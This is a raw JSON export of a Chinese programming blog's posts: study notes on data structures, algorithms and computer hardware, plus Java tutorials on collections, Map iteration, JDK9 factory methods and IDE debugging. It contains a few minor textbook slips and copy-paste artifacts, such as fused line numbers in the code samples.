栈的基本运算 入栈，退栈与读栈顶元素。 入栈运算 入栈运算是指在栈顶位置插入一个新元素。 有两个基本操作： 将栈顶指针加1，top=top+1； 然后将新元素插入栈顶指针指向的位置； 退栈运算 取出栈顶元素，并赋值给某个变量 两个基本操作： 将栈顶元素赋值给变量 然后栈顶指针减1，top=top-1 读栈顶元素 将栈顶元素赋值给一个指定的变量且栈顶指针不会改变。 总结 栈是按照“先进后出”或先进先出的原则组织数据的线性表 在栈的入栈和退栈的运算当中，栈底指针bottom维持不变。 因为栈能保存数据，因此栈具有记忆作用 栈内的元素个数计算：|TOP-BOTTOM|+1,其中BOTTOM&gt;=1,如果栈当中TOP=BOTTOM=0说明栈是空的 栈是线性结构，在计算机中担当着临时存储的功能。 队列及其基本运算 队列的基本概念 队列（queue）是限定仅在表的一端进行插入，而在表的另一端进行删除的线性表。 在队列中，允许插入的一端称为队尾，允许删除的一端称为队头。 队列又称为“先进先出”或&quot;后进后出&quot;的线性表。 在队列中，通常用指针front指向队头元素的前一个位置，用rear指向队尾最后一个元素。 循环队列 循环队列元素个数计算: 循环队列中元素的个数=rear（尾）- front（头）。 rear-front为正数时，便是循环队列的元素个数。 rear-front为负数时,需要再加上循环队列的容量. rear-front为零时,说明要么队列是空的,要么是满的.","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"数据结构与算法","slug":"003数据结构与算法","date":"2020-04-22T17:58:30.000Z","updated":"2020-04-25T03:16:35.920Z","comments":true,"path":"2020/04/23/003数据结构与算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/23/003数据结构与算法/","excerpt":"","text":"数据结构与算法 算法的概念 解题方案的准确而完整的描述. 算法: 运行有限的时间 有限的存储空间 得到正确的结果 算法不等于程序,也不等于计算方法,是两者的结合。 特征： 可行性 确定性（并且在任何条件下，算法都只有一条执行路径） 有穷性 拥有足够的情报 算法的基本结构： 对数据的运算操作(算数，逻辑) 算法的控制结构： 顺序结构 条件结构（分支结构） 循环结构 描述算法： 传统流程图 N-S结构化流程图（盒图） 自然语言 伪代码 一个算法可以用三种基本控制结构组合而成 算法设计方法 列举法：列举所有可能 归纳法：从特殊到一般 递归法：函数的自调用 递推法：从条件到结论 减半递推：分治 回溯：反证 算法的复杂度 算法复杂度可以分为： 时间复杂度 空间复杂度 算法的时间复杂度（和时间没有关系） 算法的计算工作量： 用算法所执行的基本运算次数来度量。 基本运算次数：是问题规模的函数 算法的计算工作量= f ( n )，其中n是问题的规模 分析算法工作量的方法： 平均性态（把每次运行程序执行的基本次数平均下来） 最坏情况复杂性（可能选最小，也可能选最大） 算法的空间复杂度 执行这个算法所需要的存储空间或者内存空间。 数据结构的基本概念 数据元素之间固有的逻辑关系，既数据的逻辑结构 数据中出现物理两个字,说明数据和计算机中的存放位置或地址有关系 数据的逻辑结构 数据结构是指带有结构的数据元素集合 结构是指数据元素之间前后件关系 一个数据结构包含两种信息： 数据元素的信息 数据元素之间的前后件关系。 数据的逻辑结构是指反映数据元素之间逻辑关系的数据结构。 数据的存储结构 数据的逻辑结构在计算机存储空间中存放的形式称为存储结构（也称数据的物理结构） 数据的存储结构存放： 数据元素的信息 数据元素之间的前后件关系 一种数据的逻辑结构,可以拥有多种物理结构（存储结构） 数据的物理结构不会影响数据本身的逻辑结构 采用不同的存储结构，则数据处理的效率是不同的 数据结构的表示： 二元关系表示 图形表示 数据结构分为线性结构和非线性结构。 数据元素有时候也称为节点或结点 最后一个节点称为叶子节点 线性结构（线性表）： 有且只有一个根节点 有且只有一个叶子节点 除根节点外，其他节点均只有一个前件（前继） 除叶子节点外，其他节点均只有一个后件（后继） 线性表示指n个数据元素的有限序列。 当n=0时，称为空表 线性表的顺序存储结构： 存储空间是连续的 按逻辑顺序依次存放的 在长度为n的线性表顺序存储结构中插入一个数,最坏情况下需要移动n个数 在长度为n的线性表顺序存储结构中删除一个数,最坏情况下需要移动n-1个数 考题 算法的空间复杂度与算法所处理的数据存储空间有关。 设数据集合为D={1,2,3,4,5,6}。 B=（D,R）中为非线性结构的是 R={（1,2），（2,3），（4,3），(3,5) } 其中R代表关系 数据的存储结构会影响算法的效率。 线性表的顺序存储结构中，其存储空间连续，各个元素所占字节数相同，元素的存储顺序与逻辑顺序一致。 时间复杂度与所用的计算工具无关。 算法设计必须考虑算法的复杂度。 算法必须能在有限个步骤之后终止。 算法强调动态的执行过程，不同于静态的计算公式。","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"计算机硬件系统","slug":"002计算机硬件系统","date":"2020-04-18T07:54:42.000Z","updated":"2020-04-19T18:43:01.225Z","comments":true,"path":"2020/04/18/002计算机硬件系统/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/18/002计算机硬件系统/","excerpt":"","text":"计算机硬件系统 以前冯诺依曼计算机结构以运算器为中心 现在以存储器为中心 计算机硬件系统主要包括: 中央处理器 内存储器 输入输出设备 它们通过总线相连接到一起 中央处理器: 运算器:对数据进行算术运算符,逻辑运算 控制器:对指令分析,控制,协调输入输出,对内存访问 存储器: 存储程序和数据 内存储器 外存储器 输入设备: 将程序和数据输入到计算机中 输出设备: 将用户信息(程序或数据)输出到外部输出设备供用户查看. 中央处理器 也叫CPU,计算机的核心部件。 负责执行软件指令将数据加工成信息。 CPU分为两部分： 控制器 运算器（算术逻辑单元） 它们都包含有寄存器和高速存储区域，用总线连接起来。 控制器： 计算机的控制中心和指挥中心 对于每个指令，控制单元都要执行4个基本操作 取指令 分析指令 执行指令 存储结果 运算器: 可以执行算数运算,逻辑运算 算数运算: +,-,*,/ 逻辑运算: ＞,≥,＜,≤,=,≠ 寄存器: 提高计算机性能 高速存储区域 临时存储数据和指令或内存地址 寄存器的大小和数量可以决定计算机的性能和速度 寄存器的类型 指令寄存器 地址寄存器 存储寄存器 累加寄存器等 总线: 在CPU内部或CPU和主板中其他部件进行信息传输的电子数据线路 通道越多,位的传输越快. 例如32位总线一次可以传输32位数据信息 CPU品质的高低，是主频和字长 主时钟： 控制CPU工作的节拍 不断产生固定频率的时钟 主时钟的频率就是主频 主频越高，运算速度越快 字长：CPU可以同时处理二进制的位数 CPU还可以通过总线访问各种输入输出设备 计算机的基本工作原理 计算机指令格式 计算机指令是能够被识别和执行的二进制代码 指令由两部分组成： 操作码 操作数（地址码） 操作码二进制位数决定了最多可以有多少种操作 操作的最多总数：2k ,其中k代表二进制位数 n种操作至少拥有的位数:[log2(n - 1)] + 1 , 其中[ ] 代表取整. 地址码: 操作对象 操作数 存储地址 寄存器 操作数: 源操作数: 本身带有的 目的操作数: 计算出来的结果 操作数一般称为地址码 有的指令只有操作码没有地址码,例如暂停指令 单字节指令: 一个字节的指令 双字节指令: 两个字节的指令 操作数和操作码所占的n个字节称为n字节指令 计算机指令的寻址方式 有效地址: 寻址方式和形式地址决定的 寻址方式: 本条指令的数据地址以及下一条将要执行的指令地址 寻址方式分两种: 指令寻址 数据寻址 指令寻址: 顺序寻址 跳跃寻址 数据寻址: 立即寻址 直接寻址 隐含寻址 间接寻址 寄存器寻址等 计算机指令系统 指令系统: 本计算机所有指令的集合 指令系统共有的功能: 数据传送指令 数据处理指令 程序控制指令 输入/输出指令 其他指令(对计算机的硬件进行管理、堆栈操作等) 计算机执行指令的基本过程 程序是解决实际问题的计算机指令的集合 程序计数器：决定了指令的执行顺序，某个程序被载入内存的时候，会将程序的第一条指令的内存单元地址赋值给程序计数器。 执行程序指令的过程 取指令 分析指令 执行指令 修改程序计数器 指令周期：完成一条指令所费的时间，越短越快 指令执行的时序 机器周期：在内存中读取一个指令字的最短时间 取指令必须占用一个机器周期 存储器","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"计算机的发展历程","slug":"001计算机的发展历程","date":"2020-04-18T06:53:12.000Z","updated":"2020-04-18T07:53:21.591Z","comments":true,"path":"2020/04/18/001计算机的发展历程/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/18/001计算机的发展历程/","excerpt":"","text":"概述 计算机的发展历程 ENIAC: 1946年 美国宾夕法尼亚大学 18000个电子管,1500个继电器 30吨 170㎡ 耗电140kW 每秒加法计算5000次 发展分为4个阶段: 电子管计算时代 晶体管计算机时代 集成电路计算机时代 大规模集成电路计算机时代 计算机体系结构 存储程序控制的计算机结构. EDSAC是第一台存储程序的计算机 存储程序思想是冯诺依曼提出的,概括了: 计算机(硬件)由运算器,存储器,控制器,输入输出设备五大基本部件组成. 计算机内部采用二进制来表示指令和数据 将编好的程序和源数据放在存储器中,再启动计算机工作. 非冯诺依曼结构计算机: 数据流计算机 归约计算机 智能计算机 计算机系统基本组成 分为硬件系统和软件系统. 计算机软件: 在硬件设备上运行的各种程序、数据。 程序：指挥计算机完成各种任务的指令集合。 为了方便阅读和修改程序，会提供关于程序的说明和资料，称为文档 裸机（硬件系统），只能识别机器代码 硬件系统和软件系统是相互依赖，不可分割的。 软件系统：运行，管理，维护计算机编制的程序，数据和文档的总称。 计算机软件分为： 系统软件（控制，协调计算机，外部设备，应用软件开发和运行）：主要负责调度，监控，维护计算机系统 操作系统 语言处理系统 数据库管理系统 系统辅助处理程序 应用软件 信息管理软件 辅助设计软件 文字处理软件 图形软件 各种程序包","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"模拟斗地主洗牌发牌(有序版本)","slug":"java00195模拟斗地主洗牌发牌","date":"2020-04-05T16:52:57.000Z","updated":"2020-04-05T16:57:29.087Z","comments":true,"path":"2020/04/06/java00195模拟斗地主洗牌发牌/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00195模拟斗地主洗牌发牌/","excerpt":"","text":"模拟斗地主洗牌发牌(有序版本) 按照斗地主的规则，完成洗牌发牌的动作。 具体规则： 组装54张扑克牌将 54张牌顺序打乱 三个玩家参与游戏，三人交替摸牌，每人17张牌，最后三张留作底牌。 查看三人各自手中的牌（按照牌的大小排序）、底牌 规则：手中扑克牌从大到小的摆放顺序：大王,小王,2,A,K,Q,J,10,9,8,7,6,5,4,3 案例需求分析 准备牌： 完成数字与纸牌的映射关系： 使用双列Map(HashMap)集合，完成一个数字与字符串纸牌的对应关系(相当于一个字典)。 洗牌： 通过数字完成洗牌发牌 发牌： 将每个人以及底牌设计为ArrayList&lt;String&gt;,将最后3张牌直接存放于底牌，剩余牌通过对3取模依次发牌。 存放的过程中要求数字大小与斗地主规则的大小对应。 将代表不同纸牌的数字分配给不同的玩家与底牌。 看牌： 通过Map集合找到对应字符展示。 通过查询纸牌与数字的对应关系，由数字转成纸牌字符串再进行展示。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122package com.itheima.demo06.Test;import java.util.ArrayList;import java.util.Collections;import java.util.HashMap;import java.util.List;/* 斗地主综合案例:有序版本 1.准备牌 2.洗牌 3.发牌 4.排序 5.看牌 */public class DouDiZhu &#123; public static void main(String[] args) &#123; //1.准备牌 //创建一个Map集合,存储牌的索引和组装好的牌 HashMap&lt;Integer,String&gt; poker = new HashMap&lt;&gt;(); //创建一个List集合,存储牌的索引 ArrayList&lt;Integer&gt; pokerIndex = new ArrayList&lt;&gt;(); //定义两个集合,存储花色和牌的序号 List&lt;String&gt; colors = List.of(\"♠\", \"♥\", \"♣\", \"♦\"); List&lt;String&gt; numbers = List.of(\"2\", \"A\", \"K\", \"Q\", \"J\", \"10\", \"9\", \"8\", \"7\", \"6\", \"5\", \"4\", \"3\"); //把大王和小王存储到集合中 //定义一个牌的索引 int index = 0; poker.put(index,\"大王\"); pokerIndex.add(index); index++; poker.put(index,\"小王\"); pokerIndex.add(index); index++; //循环嵌套遍历两个集合,组装52张牌,存储到集合中 for (String number : numbers) &#123; for (String color : colors) &#123; poker.put(index,color+number); pokerIndex.add(index); index++; &#125; &#125; //System.out.println(poker); //System.out.println(pokerIndex); /* 2.洗牌 使用Collections中的方法shuffle(List) */ Collections.shuffle(pokerIndex); //System.out.println(pokerIndex); /* 3.发牌 */ //定义4个集合,存储玩家牌的索引,和底牌的索引 ArrayList&lt;Integer&gt; player01 = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; player02 = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; player03 = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; diPai = new ArrayList&lt;&gt;(); //遍历存储牌索引的List集合,获取每一个牌的索引 for (int i = 0; i &lt;pokerIndex.size() ; i++) &#123; Integer in = pokerIndex.get(i); //先判断底牌 if(i&gt;=51)&#123; //给底牌发牌 diPai.add(in); &#125;else if(i%3==0)&#123; //给玩家1发牌 player01.add(in); &#125;else if(i%3==1)&#123; //给玩家2发牌 player02.add(in); &#125;else if(i%3==2)&#123; //给玩家3发牌 player03.add(in); &#125; &#125; /* 4.排序 使用Collections中的方法sort(List) 默认是升序排序 */ Collections.sort(player01); Collections.sort(player02); Collections.sort(player03); Collections.sort(diPai); /* 5.看牌 调用看牌的方法 */ lookPoker(\"刘德华\",poker,player01); lookPoker(\"周润发\",poker,player02); lookPoker(\"周星驰\",poker,player03); lookPoker(\"底牌\",poker,diPai); &#125; /* 定义一个看牌的方法,提高代码的复用性 参数: String name:玩家名称 HashMap&lt;Integer,String&gt; poker:存储牌的poker集合 ArrayList&lt;Integer&gt; list:存储玩家和底牌的List集合 查表法: 遍历玩家或者底牌集合,获取牌的索引 使用牌的索引,去Map集合中,找到对应的牌 */ public static void lookPoker(String name,HashMap&lt;Integer,String&gt; poker,ArrayList&lt;Integer&gt; list)&#123; //输出玩家名称,不换行 System.out.print(name+\":\"); //遍历玩家或者底牌集合,获取牌的索引 for (Integer key : list) &#123; //使用牌的索引,去Map集合中,找到对应的牌 String value = poker.get(key); System.out.print(value+\" \"); &#125; System.out.println();//打印完每一个玩家的牌,换行 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Debug追踪","slug":"java00194Debug追踪","date":"2020-04-05T16:46:44.000Z","updated":"2020-04-05T16:51:17.906Z","comments":true,"path":"2020/04/06/java00194Debug追踪/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00194Debug追踪/","excerpt":"","text":"Debug追踪 使用IDEA的断点调试功能，查看程序的运行过程 Debug调试程序: 可以让代码逐行执行,查看代码执行的过程,调试程序中出现的bug 使用方式: 在行号的右边,鼠标左键单击,添加断点(每个方法的第一行,哪里有bug添加到哪里) 右键,选择Debug执行程序 程序就会停留在添加的第一个断点处 执行程序: f8:逐行执行程序 f7:进入到方法中 shift+f8:跳出方法 f9:跳到下一个断点,如果没有下一个断点,那么就结束程序 ctrl+f2:退出debug模式,停止程序 Console:切换到控制台 在有效代码行，点击行号右边的空白区域，设置断点，程序执行到断点将停止，我们可以手动来运行程序 点击Debug运行模式 ​ 程序停止在断点上不再执行，而IDEA最下方打开了Debug调试窗口 Debug调试窗口介绍 快捷键F8，代码向下执行一行,第九行执行完毕，执行到第10行（第10行还未执行） 切换到控制台面板，控制台显示 请录入一个字符串： 并且等待键盘录入 快捷键F8，程序继续向后执行，执行键盘录入操作，在控制台录入数据 ababcea 回车之后效果： 调试界面效果： 此时到达findChar方法，快捷键F7，进入方法findChar 快捷键F8 接续执行，创建了map对象，变量区域显示 快捷键F8 接续执行，进入到循环中，循环变量i为 0,F8再继续执行，就获取到变量c赋值为字符‘a’ 字节值97 快捷键F8 接续执行，进入到判断语句中，因为该字符 不在Map集合键集中，再按F8执行，进入该判断中 快捷键F8 接续执行，循环结束，进入下次循环，此时map中已经添加一对儿元素 快捷键F8 接续执行，进入下次循环，再继续上面的操作，我们就可以看到代码每次是如何执行的了 如果不想继续debug,那么可以使用快捷键F9,程序正常执行到结束，程序结果在控制台显示","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"JDK9对集合添加的优化","slug":"java00193JDK9对集合添加的优化","date":"2020-04-05T16:42:04.000Z","updated":"2020-04-05T16:45:27.481Z","comments":true,"path":"2020/04/06/java00193JDK9对集合添加的优化/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00193JDK9对集合添加的优化/","excerpt":"","text":"JDK9对集合添加的优化 JDK9的新特性: List接口,Set接口,Map接口:里边增加了一个静态的方法of,可以给集合一次性添加多个元素 static &lt;E&gt; List&lt;E&gt; of(E… elements) 使用前提: 当集合中存储的元素的个数已经确定了,不在改变时使用 注意: 1.of方法只适用于List接口,Set接口,Map接口,不适用于接接口的实现类 2.of方法的返回值是一个不能改变的集合,集合不能再使用add,put方法添加元素,会抛出异常 3.Set接口和Map接口在调用of方法的时候,不能有重复的元素,否则会抛出异常 12345678910111213141516171819202122232425package com.itheima.demo04.JDK9;import java.util.List;import java.util.Map;import java.util.Set;public class Demo01JDK9 &#123; public static void main(String[] args) &#123; List&lt;String&gt; list = List.of(\"a\", \"b\", \"a\", \"c\", \"d\"); System.out.println(list);//[a, b, a, c, d] //list.add(\"w\");//UnsupportedOperationException:不支持操作异常 //Set&lt;String&gt; set = Set.of(\"a\", \"b\", \"a\", \"c\", \"d\");//IllegalArgumentException:非法参数异常,有重复的元素 Set&lt;String&gt; set = Set.of(\"a\", \"b\", \"c\", \"d\"); System.out.println(set); //set.add(\"w\");//UnsupportedOperationException:不支持操作异常 //Map&lt;String, Integer&gt; map = Map.of(\"张三\", 18, \"李四\", 19, \"王五\", 20,\"张三\",19); //IllegalArgumentException:非法参数异常,有重复的元素 Map&lt;String, Integer&gt; map = Map.of(\"张三\", 18, \"李四\", 19, \"王五\", 20); System.out.println(map);//&#123;王五=20, 李四=19, 张三=18&#125; //map.put(\"赵四\",30);//UnsupportedOperationException:不支持操作异常 &#125;&#125; 需要注意以下两点： 1:of()方法只是Map，List，Set这三个接口的静态方法，其父类接口和子类实现并没有这类方法，比如 HashSet，ArrayList等待； 2:返回的集合是不可变的；","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Hashtable集合","slug":"java00192Hashtable集合","date":"2020-04-05T16:37:33.000Z","updated":"2020-04-05T16:40:30.624Z","comments":true,"path":"2020/04/06/java00192Hashtable集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00192Hashtable集合/","excerpt":"","text":"Hashtable集合 java.util.Hashtable&lt;K,V&gt;集合 implements Map&lt;K,V&gt;接口 Hashtable:底层也是一个哈希表,是一个线程安全的集合,是单线程集合,速度慢 HashMap:底层是一个哈希表,是一个线程不安全的集合,是多线程的集合,速度快 HashMap集合(之前学的所有的集合):可以存储null值,null键 Hashtable集合,不能存储null值,null键 Hashtable和Vector集合一样,在jdk1.2版本之后被更先进的集合(HashMap,ArrayList)取代了 Hashtable的子类Properties依然活跃在历史舞台 Properties集合是一个唯一和IO流相结合的集合 1234567891011121314151617181920package com.itheima.demo03.Map;import java.util.HashMap;import java.util.Hashtable;public class Demo02Hashtable &#123; public static void main(String[] args) &#123; HashMap&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put(null,\"a\"); map.put(\"b\",null); map.put(null,null); System.out.println(map);//&#123;null=null, b=null&#125; Hashtable&lt;String,String&gt; table = new Hashtable&lt;&gt;(); //table.put(null,\"a\");//NullPointerException //table.put(\"b\",null);//NullPointerException table.put(null,null);//NullPointerException &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合练习","slug":"java00191Map集合练习","date":"2020-04-05T16:32:25.000Z","updated":"2020-04-05T16:35:37.011Z","comments":true,"path":"2020/04/06/java00191Map集合练习/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00191Map集合练习/","excerpt":"","text":"Map集合练习 练习: 计算一个字符串中每个字符出现次数 分析: 1.使用Scanner获取用户输入的字符串 2.创建Map集合,key是字符串中的字符,value是字符的个数 3.遍历字符串,获取每一个字符 4.使用获取到的字符,去Map集合判断key是否存在 key存在: 通过字符(key),获取value(字符个数) value++ put(key,value)把新的value存储到Map集合中 key不存在: put(key,1) 5.遍历Map集合,输出结果 12345678910111213141516171819202122232425262728293031323334package com.itheima.demo03.Map;import java.util.HashMap;import java.util.Scanner;public class Demo03MapTest &#123; public static void main(String[] args) &#123; //1.使用Scanner获取用户输入的字符串 Scanner sc = new Scanner(System.in); System.out.println(\"请输入一个字符串:\"); String str = sc.next(); //2.创建Map集合,key是字符串中的字符,value是字符的个数 HashMap&lt;Character,Integer&gt; map = new HashMap&lt;&gt;(); //3.遍历字符串,获取每一个字符 for(char c :str.toCharArray())&#123; //4.使用获取到的字符,去Map集合判断key是否存在 if(map.containsKey(c))&#123; //key存在 Integer value = map.get(c); value++; map.put(c,value); &#125;else&#123; //key不存在 map.put(c,1); &#125; &#125; //5.遍历Map集合,输出结果 for(Character key :map.keySet())&#123; Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"LinkedHashMap","slug":"java00190LinkedHashMap","date":"2020-04-05T16:29:14.000Z","updated":"2020-04-05T16:31:14.118Z","comments":true,"path":"2020/04/06/java00190LinkedHashMap/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00190LinkedHashMap/","excerpt":"","text":"LinkedHashMap java.util.LinkedHashMap&lt;K,V&gt; entends HashMap&lt;K,V&gt; Map 接口的哈希表和链接列表实现，具有可预知的迭代顺序。 底层原理: 哈希表+链表(记录元素的顺序) 1234567891011121314151617181920212223package com.itheima.demo03.Map;import java.util.HashMap;import java.util.LinkedHashMap;public class Demo01LinkedHashMap &#123; public static void main(String[] args) &#123; HashMap&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put(\"a\",\"a\"); map.put(\"c\",\"c\"); map.put(\"b\",\"b\"); map.put(\"a\",\"d\"); System.out.println(map);// key不允许重复,无序 &#123;a=d, b=b, c=c&#125; LinkedHashMap&lt;String,String&gt; linked = new LinkedHashMap&lt;&gt;(); linked.put(\"a\",\"a\"); linked.put(\"c\",\"c\"); linked.put(\"b\",\"b\"); linked.put(\"a\",\"d\"); System.out.println(linked);// key不允许重复,有序 &#123;a=d, c=c, b=b&#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"HashMap存储自定义类型键值","slug":"java00189HashMap存储自定义类型键值","date":"2020-04-05T16:06:03.000Z","updated":"2020-04-05T16:28:40.833Z","comments":true,"path":"2020/04/06/java00189HashMap存储自定义类型键值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00189HashMap存储自定义类型键值/","excerpt":"","text":"HashMap存储自定义类型键值 HashMap存储自定义类型键值 Map集合保证key是唯一的: 作为key的元素,必须重写hashCode方法和equals方法,以保证key唯一 当给HashMap中存放自定义对象时，如果自定义对象作为key存在，这时要保证对象唯一，必须复写对象的hashCode和equals方法(如果忘记，请回顾HashSet存放自定义对象)。 如果要保证map中存放的key和取出的顺序一致，可以使用java.util.LinkedHashMap集合来存放。 12345678910111213141516171819public class HashMapTest &#123; public static void main(String[] args) &#123; //1,创建Hashmap集合对象。 Map&lt;Student,String&gt;map = new HashMap&lt;Student,String&gt;(); //2,添加元素。 map.put(newStudent(\"lisi\",28), \"上海\"); map.put(newStudent(\"wangwu\",22), \"北京\"); map.put(newStudent(\"zhaoliu\",24), \"成都\"); map.put(newStudent(\"zhouqi\",25), \"广州\"); map.put(newStudent(\"wangwu\",22), \"南京\"); //3,取出元素。键找值方式 Set&lt;Student&gt;keySet = map.keySet(); for(Student key: keySet)&#123; Stringvalue = map.get(key); System.out.println(key.toString()+\".....\"+value); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.itheima.demo02.Map;import java.util.HashMap;import java.util.Map;import java.util.Set;public class Demo01HashMapSavePerson &#123; public static void main(String[] args) &#123; show02(); &#125; /* HashMap存储自定义类型键值 key:Person类型 Person类就必须重写hashCode方法和equals方法,以保证key唯一 value:String类型 可以重复 */ private static void show02() &#123; //创建HashMap集合 HashMap&lt;Person,String&gt; map = new HashMap&lt;&gt;(); //往集合中添加元素 map.put(new Person(\"女王\",18),\"英国\"); map.put(new Person(\"秦始皇\",18),\"秦国\"); map.put(new Person(\"普京\",30),\"俄罗斯\"); map.put(new Person(\"女王\",18),\"毛里求斯\"); //使用entrySet和增强for遍历Map集合 Set&lt;Map.Entry&lt;Person, String&gt;&gt; set = map.entrySet(); for (Map.Entry&lt;Person, String&gt; entry : set) &#123; Person key = entry.getKey(); String value = entry.getValue(); System.out.println(key+\"--&gt;\"+value); &#125; &#125; /* HashMap存储自定义类型键值 key:String类型 String类重写hashCode方法和equals方法,可以保证key唯一 value:Person类型 value可以重复(同名同年龄的人视为同一个) */ private static void show01() &#123; //创建HashMap集合 HashMap&lt;String,Person&gt; map = new HashMap&lt;&gt;(); //往集合中添加元素 map.put(\"北京\",new Person(\"张三\",18)); map.put(\"上海\",new Person(\"李四\",19)); map.put(\"广州\",new Person(\"王五\",20)); map.put(\"北京\",new Person(\"赵六\",18)); //使用keySet加增强for遍历Map集合 Set&lt;String&gt; set = map.keySet(); for (String key : set) &#123; Person value = map.get(key); System.out.println(key+\"--&gt;\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类里定义的接口和使用","slug":"java00188类里定义的接口和使用","date":"2020-04-04T18:06:00.000Z","updated":"2020-04-04T18:25:09.202Z","comments":true,"path":"2020/04/05/java00188类里定义的接口和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/05/java00188类里定义的接口和使用/","excerpt":"","text":"类里定义的接口和使用 格式: 123456public class 类名&#123; //在类里面定义接口 修饰符 interface 接口名&#123; //抽象方法; &#125;&#125; 123456public class TestA&#123; //在类里面定义接口 private interface A&#123; public abstract void show(); &#125;&#125; 实现接口: 在类方法中用new实现,通过多态接收 123456789101112131415161718public class TestA&#123; //在类里面定义接口 //如果接口修饰符石private,那么此接口只能在本类中使用. public interface A&#123; public abstract void show(); &#125; public void show()&#123; A a = new A()&#123; @Override public void show() &#123; System.out.println(\"111111\"); &#125; &#125;; a.show(); &#125;&#125; 在new的时候实现 1234567891011121314package com.itheima.demo11;public class DemoClass&#123; public static void main(String[] args) &#123; TestA.A a = new TestA.A()&#123; @Override public void show()&#123; System.out.println(\"我是TestA类中的A接口\"); &#125; &#125;; a.show(); &#125;&#125; 在其他类中实现 12345678package com.itheima.demo11;public class TestB implements TestA.A&#123; @Override public void show() &#123; &#125;&#125; 在本类中的内部类实现 123456789101112public class TestA&#123; //在类里面定义接口 private interface A&#123; public abstract void show(); &#125; public class TestC implements A&#123; @Override public void show() &#123; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合遍历键值对方式","slug":"java00187Map集合遍历键值对方式","date":"2020-04-04T17:27:12.000Z","updated":"2020-04-04T17:30:07.198Z","comments":true,"path":"2020/04/05/java00187Map集合遍历键值对方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/05/java00187Map集合遍历键值对方式/","excerpt":"","text":"Map集合遍历键值对方式 键值对方式：即通过集合中每个键值对(Entry)对象，获取键值对(Entry)对象中的键与值。 操作步骤与图解： 获取Map集合中，所有的键值对(Entry)对象，以Set集合形式返回。方法提示:entrySet()。 遍历包含键值对(Entry)对象的Set集合，得到每一个键值对(Entry)对象。 通过键值对(Entry)对象，获取Entry对象中的键与值。 方法提示:getkey() getValue() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.itheima.demo01.Map;import java.util.HashMap;import java.util.Iterator;import java.util.Map;import java.util.Set;/* Map集合遍历的第二种方式:使用Entry对象遍历 Map集合中的方法: Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() 返回此映射中包含的映射关系的 Set 视图。 实现步骤: 1.使用Map集合中的方法entrySet(),把Map集合中多个Entry对象取出来,存储到一个Set集合中 2.遍历Set集合,获取每一个Entry对象 3.使用Entry对象中的方法getKey()和getValue()获取键与值 */public class Demo03EntrySet &#123; public static void main(String[] args) &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); //1.使用Map集合中的方法entrySet(),把Map集合中多个Entry对象取出来,存储到一个Set集合中 Set&lt;Map.Entry&lt;String, Integer&gt;&gt; set = map.entrySet(); //2.遍历Set集合,获取每一个Entry对象 //使用迭代器遍历Set集合 Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; it = set.iterator(); while(it.hasNext())&#123; Map.Entry&lt;String, Integer&gt; entry = it.next(); //3.使用Entry对象中的方法getKey()和getValue()获取键与值 String key = entry.getKey(); Integer value = entry.getValue(); System.out.println(key+\"=\"+value); &#125; System.out.println(\"-----------------------\"); for(Map.Entry&lt;String,Integer&gt; entry:set)&#123; //3.使用Entry对象中的方法getKey()和getValue()获取键与值 String key = entry.getKey(); Integer value = entry.getValue(); System.out.println(key+\"=\"+value); &#125; 